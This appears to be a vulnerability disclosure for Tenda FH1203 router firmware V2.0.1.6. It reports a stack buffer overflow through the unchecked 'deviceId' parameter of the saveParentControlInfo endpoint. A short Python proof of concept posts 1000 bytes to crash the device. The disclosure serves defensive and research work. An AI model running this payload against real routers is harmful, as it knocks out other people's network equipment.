## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details

The function `saveParentControlInfo` contains a stack-based buffer overflow vulnerability. It reads in a user-provided parameter `deviceId`, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer.

![image-20240319223210791](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223210791.png)

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

![image-20240319223227916](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223227916.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000

data = {"deviceId": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240320014324581](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240320014324581.png)
